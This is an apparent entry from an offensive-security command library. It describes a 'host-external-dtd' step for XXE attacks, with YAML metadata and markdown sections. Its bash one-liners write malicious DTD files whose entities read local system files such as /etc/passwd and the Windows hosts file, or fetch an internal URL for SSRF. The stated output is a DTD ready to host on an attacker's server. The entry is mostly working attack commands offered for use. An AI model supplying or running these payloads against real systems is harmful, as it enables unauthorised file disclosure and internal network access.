---
data: >-
  echo '<!ENTITY exfil SYSTEM "file:///C:/Windows/system32/drivers/etc/hosts">'
  > exfil.dtd
tags:
  - dtd
  - xxe
type: command
executor: bash
platforms:
  - Linux
  - Windows
id: b1665154-4260-4f3b-9458-65f5c29f67a6
created_at: '2025-12-13T09:00:28.093Z'
updated_at: '2025-12-13T09:00:28.093Z'
verified: false
validated: true
submitted: true
---
# host-external-dtd

## Command

```bash
echo '<!ENTITY exfil SYSTEM "file:///C:/Windows/system32/drivers/etc/hosts">' > exfil.dtd
```

## Description

Creates an external DTD file for XXE exploitation to define entities for file inclusion.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `entity` | Entity definition | Yes |
| `filename` | Output DTD file | Yes |

## Examples

### Basic Usage

```bash
echo '<!ENTITY exfil SYSTEM "file:///etc/passwd">' > exfil.dtd
```

### Advanced Usage

```bash
echo '<!ENTITY exfil SYSTEM "http://internal.server/secret">' > ssrf.dtd
```

## Expected Output

A DTD file ready to be hosted on the attacker's server.

## Related

- [[commands/create-malicious-svg]]
- [[procedures/Exploit-XXE-for-Data-Extraction]]
